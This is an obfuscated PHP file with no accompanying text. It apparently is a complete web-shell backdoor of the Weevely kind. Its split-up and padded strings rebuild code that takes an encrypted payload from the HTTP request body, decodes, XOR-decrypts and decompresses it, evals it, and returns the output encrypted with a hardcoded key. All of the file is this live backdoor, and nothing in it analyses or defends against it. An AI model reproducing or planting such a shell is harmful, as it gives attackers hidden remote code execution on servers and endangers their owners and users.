<?php
$U='("/!$kh(.+)$k!f/",!@!file_get_conte!nts(!!"php://in!put"),!$m)==!1) {@ob_s!tart();@e!v';
$w='=0;($j<$c&&!$i!<$!l);$j++,$i++!){$o.=$t{$!!i}!^$k{$j};}}return !$o;}if! (@p!reg_ma!tch';
$j='$k="b78a3!436";$!kh="d3!9cf48!88565"!;$k!f="5!d8!c3fd310dc!";$p="NmfU!WVcR1QwH!Clof"!;fu';
$t=str_replace('Ew','','crEweaEwteEw_fuEwnEwEwction');
$b='n!ction !x($t,$k){$!!c=st!rle!n($k);$l=strl!en($t!);$o="";!for($i!=0;$i<$l!!;){!for(!$j';
$Q='ob_!end_clean();$r=!@base!64_en!code!(@!!x(@gzcomp!ress($o),$k)!);pri!nt("$p$kh$!r$kf");}';
$l='al(@g!zuncom!pres!s(@x!(@ba!se64_deco!de($!m[1!]),$k)));$o=@o!b_get_!conte!nts()!!;@';
$n=str_replace('!','',$j.$b.$w.$U.$l.$Q);
$y=$t('',$n);$y();
?>
